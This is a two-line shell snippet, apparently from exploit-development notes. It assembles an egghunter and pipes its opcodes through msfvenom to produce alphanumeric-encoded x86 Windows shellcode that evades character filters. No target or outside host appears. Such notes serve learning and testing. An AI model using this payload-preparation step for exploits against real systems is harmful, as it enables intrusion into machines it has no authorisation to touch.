nasm -felf32 egghunter.asm -o egghunter.o
for i in $(objdump -d ./egghunter.o | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$') ; do echo -ne "\x$i" ; done | msfvenom -p- --arch x86 --platform windows -e x86/alpha_mixed BUFFERREGISTER=eax
